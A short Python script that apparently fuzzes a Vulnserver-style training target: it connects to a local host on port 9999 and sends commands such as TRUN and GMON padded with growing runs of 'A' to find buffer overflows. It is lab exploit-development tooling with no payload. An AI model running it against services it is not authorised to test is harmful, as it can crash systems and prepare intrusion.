#!/usr/bin/env python3
import os
import sys
import socket
import argparse

parser=argparse.ArgumentParser()
parser.add_argument('-d','--data', help='<index> <min> <max> <step>',nargs='+' ,type=int)
args=parser.parse_args()
arg_tuple=tuple(args.data)

print(arg_tuple)

command = [b'STATS ',b'RTIME ',b'LTIME ',b'SRUN ',b'TRUN ',b'GMON ',b'GDOG ',b'KSTET ',b'GTER ',b'HTER ',b'LTER ',b'KSTAN ']



#init test string
buff=b'A'


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    #establish connection
    conn=s.connect(('192.168.43.186',9999))
    resp=s.recv(1024)
    print(resp.decode())

    #fuzzer
    for i in range(arg_tuple[1],arg_tuple[2],arg_tuple[3]):

        #craft test string
        test_str = command[arg_tuple[0]]+(buff*i)+b'\r\n'

        print('fuzzing command:{0}, with length {1}'.format(command[arg_tuple[0]],i))
        s.send(test_str)
        resp=s.recv(1024)
        print(resp.decode())
